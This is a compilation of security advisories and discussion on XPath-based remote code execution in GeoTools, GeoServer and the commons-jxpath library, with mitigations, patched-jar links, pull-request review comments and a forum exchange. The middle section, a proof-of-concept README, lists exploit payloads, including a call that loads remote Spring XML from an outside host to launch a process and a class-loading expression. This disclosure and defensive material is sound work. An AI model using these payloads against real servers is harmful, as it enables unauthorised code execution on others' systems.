## Description

### Summary

Remote Code Execution (RCE) is possible if an application uses certain GeoTools functionality to evaluate XPath expressions supplied by user input.

### Details

The following methods pass XPath expressions to the `commons-jxpath` library which can execute arbitrary code and would be a security issue if the XPath expressions are provided by user input.

* `org.geotools.appschema.util.XmlXpathUtilites.getXPathValues(NamespaceSupport, String, Document)`
* `org.geotools.appschema.util.XmlXpathUtilites.countXPathNodes(NamespaceSupport, String, Document)`
* `org.geotools.appschema.util.XmlXpathUtilites.getSingleXPathValue(NamespaceSupport, String, Document)`
* `org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.get(Object, String, Class<T>)`
* `org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.set(Object, String, Object, Class)`
* `org.geotools.data.complex.expression.MapPropertyAccessorFactory.new PropertyAccessor() {...}.get(Object, String, Class<T>)`
* `org.geotools.xsd.StreamingParser.StreamingParser(Configuration, InputStream, String)`

### PoC

The following inputs to StreamingParser will delay the response by five seconds:

```
        new org.geotools.xsd.StreamingParser(
                        new org.geotools.filter.v1_0.OGCConfiguration(),
                        new java.io.ByteArrayInputStream("<Filter></Filter>".getBytes()),
                        "java.lang.Thread.sleep(5000)")
                .parse();

```
### Impact

This vulnerability can lead to executing arbitrary code.

### Mitigation

GeoTools can operate with reduced functionality by removing the `gt-complex` jar from your application. As an example of the impact application schema datastore would not function without the ability to use XPath expressions to query complex content.

The SourceForge download page lists drop-in-replacement jars for GeoTools: [31.1](https://sourceforge.net/projects/geotools/files/GeoTools%2031%20Releases/31.1/), [30.3](https://sourceforge.net/projects/geotools/files/GeoTools%2030%20Releases/30.3/geotools-30.3-patches.zip/download), [30.2](https://sourceforge.net/projects/geotools/files/GeoTools%2030%20Releases/30.2/geotools-30.2-patches.zip/download), [29.2](https://sourceforge.net/projects/geotools/files/GeoTools%2029%20Releases/29.2/geotools-29.2-patches.zip/download), [28.2](https://sourceforge.net/projects/geotools/files/GeoTools%2028%20Releases/28.2/geotools-28.2-patches.zip/download), [27.5](https://sourceforge.net/projects/geotools/files/GeoTools%2027%20Releases/27.5/geotools-27.5-patches.zip/download), [27.4](https://sourceforge.net/projects/geotools/files/GeoTools%2027%20Releases/27.4/geotools-27.4-patches.zip/download), [26.7](https://sourceforge.net/projects/geotools/files/GeoTools%2026%20Releases/26.7/geotools-26.7-patches.zip/download), [26.4](https://sourceforge.net/projects/geotools/files/GeoTools%2026%20Releases/26.4/), [25.2](https://sourceforge.net/projects/geotools/files/GeoTools%2025%20Releases/25.2/geotools-25.2-patches.zip/download), [24.0](https://sourceforge.net/projects/geotools/files/GeoTools%2024%20Releases/24.0/geotools-24.0-patches.zip/download). These jars are for download only and are not available from maven central, intended to quickly provide a fix to affected applications.

## Description

### Summary

Multiple OGC request parameters allow Remote Code Execution (RCE) by unauthenticated users through specially crafted input against a default GeoServer installation due to unsafely evaluating property names as XPath expressions.

### Details

The GeoTools library API that GeoServer calls evaluates property/attribute names for feature types in a way that unsafely passes them to the commons-jxpath library which can execute arbitrary code when evaluating XPath expressions. This XPath evaluation is intended to be used only by complex feature types (i.e., Application Schema data stores) but is incorrectly being applied to simple feature types as well which makes this vulnerability apply to **ALL** GeoServer instances.

### PoC

No public PoC is provided but this vulnerability has been confirmed to be exploitable through WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic and WPS Execute requests.

### Impact

This vulnerability can lead to executing arbitrary code.

### Workaround

A workaround exists by removing the `gt-complex-x.y.jar` file from the GeoServer where `x.y` is the GeoTools version (e.g., `gt-complex-31.1.jar` if running GeoServer 2.25.1). This will remove the vulnerable code from GeoServer but may break some GeoServer functionality or prevent GeoServer from deploying if the gt-complex module is needed by an extension you are using:

Mitigation for `geoserver.war` deploy:

1. Stop the application server
2. Unzip `geoserver.war` into a directory
3. Locate the file `WEB-INF/lib/gt-complex-x.y.jar` and remove
4. Zip the directory into a new `geoserver.war`
5. Restart the application server

Mitigation for GeoServer binary:

1. Stop Jetty
2. Locate the file `webapps/geoserver/WEB-INF/lib/gt-complex-x.y.jar` and remove
3. Restart Jetty

The following extensions and community modules are known to have a direct dependency on `gt-complex` jar and are not expected function properly without it. This is not comprehensive list and additional GeoServer functionality may be dependent on the availability of `gt-complex` jar:

* Extensions: Application Schema, Catalog Services for the Web, MongoDB Data Store
* Community Modules: Features-Templating, OGC API Modules, Smart Data Loader, SOLR Data Store

Mitigation available for prior releases patching three jars in your existing install:

1. Patched `gt-app-schema`, `gt-complex` and `gt-xsd-core` jars may be downloaded for GeoServer: [2.25.1](https://sourceforge.net/projects/geoserver/files/GeoServer/2.25.1/geoserver-2.25.1-patches.zip/download), [2.24.3](https://sourceforge.net/projects/geoserver/files/GeoServer/2.24.3/geoserver-2.24.3-patches.zip/download), [2.24.2](https://sourceforge.net/projects/geoserver/files/GeoServer/2.24.2/geoserver-2.24.2-patches.zip/download), [2.23.2](https://sourceforge.net/projects/geoserver/files/GeoServer/2.23.2/geoserver-2.23.2-patches.zip/download), [2.22.2](https://sourceforge.net/projects/geoserver/files/GeoServer/2.22.2/geoserver-2.22.2-patches.zip/download), [2.21.5](https://sourceforge.net/projects/geoserver/files/GeoServer/2.21.5/geoserver-2.21.5-patches.zip/download), [2.21.4](https://sourceforge.net/projects/geoserver/files/GeoServer/2.21.4/geoserver-2.21.4-patches.zip/download),[2.20.7](https://sourceforge.net/projects/geoserver/files/GeoServer/2.20.7/geoserver-2.20.7-patches.zip/download), [2.20.4](https://sourceforge.net/projects/geoserver/files/GeoServer/2.20.4/geoserver-2.20.4-patches.zip/download), [2.19.2](https://sourceforge.net/projects/geoserver/files/GeoServer/2.19.2/geoserver-2.19.2-patches.zip/download), [2.18.0](https://sourceforge.net/projects/geoserver/files/GeoServer/2.18.0/geoserver-2.18.0-patches.zip/download).

   As example the 2.25.1 page links to [geoserver-2.25.1-patches.zip](https://sourceforge.net/projects/geoserver/files/GeoServer/2.25.1/geoserver-2.25.1-patches.zip/download) download on source forge.
2. Unzip the `geoserver-x.y.z-patches.zip` which contains three jars that have been patched to configure `commons-jxpath` with an empty function list prior to use. These files are drop-in replacements with identical file names to those they are replacing.
3. Follow the instructions above to locate `WEB-INF/lib` folder and replace the existing `gt-app-schema`, `gt-complex` and `gt-xsd-core` jars with those supplied by the patch.

# Remote Code Execution in JXPath Library (CVE-2022-41852) Proof of Concept

CVE-2022-41852 allows attackers to execute code on the application server.

You can read more about this vulnerability here:

* <https://hackinglab.cz/en/blog/remote-code-execution-in-jxpath-library-cve-2022-41852/>

***Note:** I am not an author of this CVE. I have only created this proof of concept.*

## Useful Links

* [JXPath GitHub](https://github.com/apache/commons-jxpath)
* [JXPath Website](https://commons.apache.org/proper/commons-jxpath/users-guide.html)
* [MITRE CVE-2022-41852](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41852)
* [NIST CVE-2022-41852](https://nvd.nist.gov/vuln/detail/CVE-2022-41852)

## Vulnerability Description

JXPath library has support for running functions in XPath expressions
(see [Official User Guide](https://commons.apache.org/proper/commons-jxpath/users-guide.html#Standard_Extension_Functions)).

For example, methods `JXPathContext.getValue(path)` and `JXPathContext.iterate(path)` are dangerous
if you let user send input into the path parameter.

## PoC Description

This PoC starts simple Spring server with two endpoints:

* `/vulnerable-example?path=[path]`
* `/secure-example?path=[path]`

These endpoints have only one query parameter "path".

### Possible Request URLs

Following requests will work fine (will not cause any problems):

* <http://localhost:8080/secure-example?path=name>
* <http://localhost:8080/secure-example?path=website>
* <http://localhost:8080/secure-example?path=/>
* <http://localhost:8080/vulnerable-example?path=name>
* <http://localhost:8080/vulnerable-example?path=website>
* <http://localhost:8080/vulnerable-example?path=/>

Following requests will cause code to be executed:

* <http://localhost:8080/vulnerable-example?path=java.lang.System.exit(42)>
* <http://localhost:8080/vulnerable-example?path=java.lang.Thread.sleep(10000)>

## Example Payloads

Example payloads to detect CVE-2022-41852:

* `java.lang.System.exit(42)`
* `java.lang.Thread.sleep(10000)`
* `/|java.lang.System.exit(42)`
* `|java.lang.System.exit(42)`

There might be various ways to execute commands. One of them is using Spring's ClassPathXmlApplicationContext:

* `org.springframework.context.support.ClassPathXmlApplicationContext.new("https://warxim.com/calc.xml")`

In the XML file, you can define bean configuration, for example, you can create instance of `ProcessBuilder`
and run specified command on the server by initializing the bean using `start()` method.
In the following example, calculator will be opened on Windows machine:

```
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="commandRunner" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>cmd</value>
        <value>/c</value>
        <value><![CDATA[calc]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

There is also a way to load new classes by traversing the context bean, for example, the following code will load class `com.warxim.dangerous.DangerousClass`, create its instance and call method `run("warxim")`:

```
JXPathContext context = JXPathContext.newContext(new Data());
String jxPath = "run(newInstance(loadClass(getClassLoader(getClass(/)), \"com.warxim.dangerous.DangerousClass\")), \"warxim\")"
Object result = context.getValue(jxPath);
```

Notice that we have to call the object methods by putting the object that contains them as a first parameter.

## Workaround for CVE-2022-41852

It is possible to disable functions in JXPathContext by setting functions field to empty `FunctionLibrary`.

```
// Create path context for person object
var pathContext = JXPathContext.newContext(person);

// Set empty function library
pathContext.setFunctions(new FunctionLibrary());

// getValue will throw org.apache.commons.jxpath.JXPathFunctionNotFoundException
return pathContext.getValue(path);
```

***Note:** It will disable all functions, so even functions like `size()` will not be available.*

## Fix

The fix is being developed, see [apache/commons-jxpath#26](https://github.com/apache/commons-jxpath/pull/26)

This PR refactors all jxpath initialization into a new utility method that disables calling functions from XPath expressions and fixes an incomplete class check that allowed complex feature code to be used on simple features. Some unnecessary dependency exclusions were also removed to clean up the pom.xml (commons-jxpath has no transitive dependencies).

Looks like a great addition. I don't really know the code, so I cannot say too much - sorry.

I think increasing the 5 second to something like 20 seconds would make it very unlikely to have a busy-machine problem. However, this is just a guess - its okay the way it is.

I am approving, with some minor feedback (test case threadsafety, and method name choice). I do not feel comfortable about "request changes" as that would block PR.

[@sikeoka](https://github.com/sikeoka) I will wait for your response/consideration before merge and backport.

I am a bit confused as to choosing a time based example? Why not `java.lang.Math.abs(-1.0)` - and test. to see that 1.0 is returned. This would be a test that is not sensitive to build server speed?

This is a type of issue that is commonly referred to as `blind`. Just because something is being done doesn't mean that the result is actually sent anywhere so I needed some kind of side effect that I could check for. I originally tested this using `System.exit` but that isn't as JUnit or Maven friendly.

Minor feedback, `newSafeContext` may promise too much, if attribute security is used for something like GeoFence security plugin this would not know enough to prevent specific data traversals.

A name like `newDataContext` would be more clear this is about providing access to data only, not functions.

I named this based on two existing cases for similar types of issues although `getSafeContext` would be a more consistent name than `newSafeContext`:

org.geoserver.template.TemplateUtils.getSafeConfiguration()

org.geotools.ysld.YamlUtil.getSafeYaml()

Thanks for the clear javadocs I appreciate it.

Minor feedback: Consider `newDataContext` to accurately describe the restriction of no methods. In a more complicated security model such as GeoFence data traversal may be considered "unsafe" leading to this method name being misleading / incomplete.

I really don't understand this comment since GeoFence has no dependence on gt-complex or commons-jxpath.

I was trying to indicate that specific attributes may be restricted (using a geofence as an example of a plugin that offers this kind of functionality).

So "safe" indicates no functions, but it would not be safe from using xpath to traverse data to access a restricted columns.

As indicated this was minor feedback only.

| Hi, bro, since the versions 30.4, 31.2, and 29.6 of GeoTools that fix the vulnerability CVE-2024-36404 are all compiled jar files based on JDK 11, could you release a version that fixes this vulnerability but is compiled with JDK 8, such as version 28.x? |

| No one has volunteered to do that. We have a public release procedure if you wish to volunteer.  Even if you back port this fix, there are other vulnerabilities in older versions so why bother? |

| No one has volunteered to do that. We have a public release procedure if you wish to volunteer.  Even if you back port this fix, there are other vulnerabilities in older versions so why bother?  Because our projects are based on Jdk8, the version of jdk11 cannot be run in our project. If I can study the open course and release a jdk 8 version of geotools that solves this vulnerability, how should I get this course? |
